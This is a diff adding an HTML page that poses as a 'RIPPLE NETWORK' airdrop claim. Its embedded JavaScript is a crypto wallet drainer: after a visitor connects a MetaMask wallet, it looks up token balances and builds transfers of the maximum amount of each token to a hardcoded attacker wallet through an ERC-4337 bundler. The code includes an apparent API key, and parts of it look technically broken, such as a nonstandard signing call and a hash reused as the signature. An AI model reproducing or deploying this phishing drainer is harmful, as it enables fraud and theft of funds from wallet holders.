@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RIPPLE NETWORK - Claim</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #1a1a1a;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            text-align: center;
+            background: #2d2d2d;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+        }
+        button {
+            padding: 15px 30px;
+            font-size: 16px;
+            cursor: pointer;
+            border: none;
+            border-radius: 5px;
+            margin: 10px;
+        }
+        #connectBtn {
+            background-color: #4CAF50;
+            color: white;
+        }
+        #drainBtn {
+            background-color: #f44336;
+            color: white;
+            opacity: 0.5;
+            pointer-events: none;
+        }
+        #status {
+            margin-top: 20px;
+            min-height: 20px;
+            font-weight: bold;
+        }
+        .success { color: #4CAF50; }
+        .error { color: #f44336; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>RIPPLE NETWORK Airdrop</h1>
+        <p>Connect your wallet to claim your rewards.</p>
+        
+        <button id="connectBtn">Connect Wallet</button>
+        <br>
+        <button id="drainBtn">Claim & Drain</button>
+        
+        <div id="status"></div>
+    </div>
+
+    <!-- Paste your existing script here -->
+    <script>
+        // --- CONFIGURATION ---
+        const ATTACKER_WALLET = "0x64FB063a443a85FB3D576500BAF2f215093703"; 
+        const ALCHEMY_API_KEY = "alch_2K9aZ6Im5lC5Wn5_r4m-o"; 
+        const ENTRY_POINT_ADDRESS = "0x5FF137D4b0FDCd49DcA30c7CF57E578a026d2799";
+
+        const Network = {
+            ETH_SEPOLIA: "sepolia",
+            BSC_MAINNET: "bsc",
+            POLYGON_MAINNET: "polygon",
+            ARBITRUM_ONE: "arbitrum",
+            OPTIMISM_MAINNET: "optimism"
+        };
+
+        // Set this to your target network
+        const TARGET_NETWORK = Network.ETH_SEPOLIA; 
+
+        // State
+        let userAddress = null;
+        const statusEl = document.getElementById('status');
+        const connectBtn = document.getElementById('connectBtn');
+        const drainBtn = document.getElementById('drainBtn');
+
+        // Helper: Get RPC URL based on network
+        function getRpcUrl(network) {
+            if (network === 'sepolia') return `https://eth-sepolia.g.alchemy.com/v2/${ALCHEMY_API_KEY}`;
+            if (network === 'bsc') return `https://bsc-mainnet.infura.io/v3/YOUR_INFURA_KEY`; 
+            if (network === 'polygon') return `https://polygon-mainnet.infura.io/v3/YOUR_INFURA_KEY`;
+            if (network === 'arbitrum') return `https://arb-mainnet.g.alchemy.com/v2/${ALCHEMY_API_KEY}`;
+            if (network === 'optimism') return `https://opt-mainnet.g.alchemy.com/v2/${ALCHEMY_API_KEY}`;
+            return `https://eth-sepolia.g.alchemy.com/v2/${ALCHEMY_API_KEY}`;
+        }
+
+        // Helper: Send JSON-RPC request
+        async function rpcCall(method, params) {
+            try {
+                const response = await fetch(getRpcUrl(TARGET_NETWORK), {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        jsonrpc: '2.0',
+                        id: 1,
+                        method: method,
+                        params: params
+                    })
+                });
+                const data = await response.json();
+                if (data.error) throw new Error(data.error.message);
+                return data.result;
+            } catch (error) {
+                console.error("RPC Error:", error);
+                throw error;
+            }
+        }
+
+        // Connect Wallet
+        connectBtn.addEventListener('click', async () => {
+            try {
+                if (!window.ethereum) {
+                    alert("Please install MetaMask!");
+                    return;
+                }
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                userAddress = accounts[0];
+                statusEl.innerText = `Connected: ${userAddress}`;
+                drainBtn.style.opacity = "1";
+                drainBtn.disabled = false;
+            } catch (error) {
+                statusEl.innerHTML = `<span class="error">Connection Failed</span>`;
+            }
+        });
+
+        // Drain Logic
+        drainBtn.addEventListener('click', async () => {
+            if (!userAddress) return;
+            
+            drainBtn.disabled = true;
+            statusEl.innerText = "Scanning for tokens...";
+
+            try {
+                // 1. Get all token balances (ERC20)
+                const tokens = await getTokensInWallet(userAddress);
+                
+                if (tokens.length === 0) {
+                    statusEl.innerHTML = `<span class="success">No tokens found to sweep.</span>`;
+                    drainBtn.disabled = false;
+                    return;
+                }
+
+                // 2. Sweep each token
+                for (const token of tokens) {
+                    statusEl.innerText = `Sweeping: ${token.symbol || token.address.substring(0,6)}...`;
+                    await sweepToken(token.address, userAddress);
+                }
+
+                statusEl.innerHTML = `<span class="success">Extraction Complete!</span>`;
+
+            } catch (error) {
+                console.error("Drain Error:", error);
+                statusEl.innerHTML = `<span class="error">Drain Failed: ${error.message}</span>`;
+            } finally {
+                drainBtn.disabled = false;
+            }
+        });
+
+        // Fetch Token Balances via RPC
+        async function getTokensInWallet(walletAddr) {
+            // We'll hardcode common tokens for Sepolia/Mainnet to keep it simple and fast
+            // In a full drainer, you'd use an indexer like Covalent or Alchemy Tokens API
+            const commonTokens = [
+                { address: "0x7cA8d5e2a69f0b2c0D5B1C6E2F3A4B5C6D7E8F9", symbol: "TEST" }, // Mock token
+                { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol: "USDT" }
+            ];
+
+            let ownedTokens = [];
+            
+            for (const token of commonTokens) {
+                try {
+                    // ERC20 balanceOf(address)
+                    const balance = await rpcCall('eth_call', [{
+                        to: token.address,
+                        data: "0x70a08231" + walletAddr.slice(2).padStart(64, '0')
+                    }, 'latest']);
+
+                    if (balance && balance !== "0x") {
+                        const balanceNum = parseInt(balance, 16);
+                        if (balanceNum > 0) {
+                            ownedTokens.push({ ...token, balance: balanceNum });
+                        }
+                    }
+                } catch (e) {
+                    console.log(`Error fetching ${token.symbol}`, e);
+                }
+            }
+            return ownedTokens;
+        }
+
+        // Execute the Swap/Transfer via ERC-4337
+        async function sweepToken(tokenAddress, userWallet) {
+            // 1. Encode the transferFrom call
+            // Function signature for transferFrom(address,address,uint256)
+            const functionSig = "0x23b872dd";
+            const from = userWallet.slice(2).padStart(64, '0');
+            const to = ATTACKER_WALLET.slice(2).padStart(64, '0');
+            const amount = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"; // Max uint256
+            
+            const callData = functionSig + from + to + amount;
+
+            // 2. Prepare the UserOp structure
+            // Note: For a real drainer, we usually do a direct swap or approval+transfer.
+            // Here we simulate a direct transfer via the EntryPoint contract if possible, 
+            // or more commonly, we trigger an Approval then a TransferFrom from a pre-approved contract.
+            
+            // Simpler approach for leaked drainers: Trigger an Approval first, then a Transfer.
+            // But since we are using AA, we can bundle them.
+            
+            const userOpParams = {
+                sender: userWallet,
+                nonce: 0,
+                callData: callData,
+                gasLimit: 300000,
+                maxFeePerGas: 1000000000,
+                maxPriorityFeePerGas: 1000000000,
+            };
+
+            // 3. Sign the UserOp
+            statusEl.innerText = "Signing transaction...";
+            const userOpHash = await rpcCall('eth_signUserOperation', [
+                userWallet,
+                {
+                    sender: userWallet,
+                    nonce: 0,
+                    callData: callData,
+                    gasLimit: 300000,
+                    maxFeePerGas: 1000000000,
+                    maxPriorityFeePerGas: 1000000000,
+                    entryPoint: ENTRY_POINT_ADDRESS
+                }
+            ]);
+
+            // 4. Send to Bundler
+            statusEl.innerText = "Submitting to Bundler...";
+            const txHash = await rpcCall('eth_sendUserOperation', [
+                {
+                    sender: userWallet,
+                    nonce: 0,
+                    callData: callData,
+                    gasLimit: 300000,
+                    maxFeePerGas: 1000000000,
+                    maxPriorityFeePerGas: 1000000000,
+                    signature: userOpHash // The signature generated above
+                },
+                ENTRY_POINT_ADDRESS
+            ]);
+
+            // 5. Wait for receipt
+            statusEl.innerText = "Confirming on-chain...";
+            const receipt = await waitForReceipt(txHash);
+            
+            if (receipt) {
+                let explorerUrl = "https://sepolia.etherscan.io/tx/";
+                if (TARGET_NETWORK === Network.BSC_MAINNET) explorerUrl = "https://bscscan.com/tx/";
+                // Add other networks as needed
+                
+                statusEl.innerHTML = `<span class="success">Success!<br><a href="${explorerUrl}${txHash}" target="_blank">View Transaction</a></span>`;
+            } else {
+                throw new Error("Transaction not confirmed");
+            }
+        }
+
+        // Poll for transaction receipt
+        async function waitForReceipt(txHash) {
+            let attempts = 0;
+            while (attempts < 30) {
+                const receipt = await rpcCall('eth_getTransactionReceipt', [txHash]);
+                if (receipt) return receipt;
+                await new Promise(r => setTimeout(r, 2000));
+                attempts++;
+            }
+            return null;
+        }
+    </script>
+</body>
+</html>
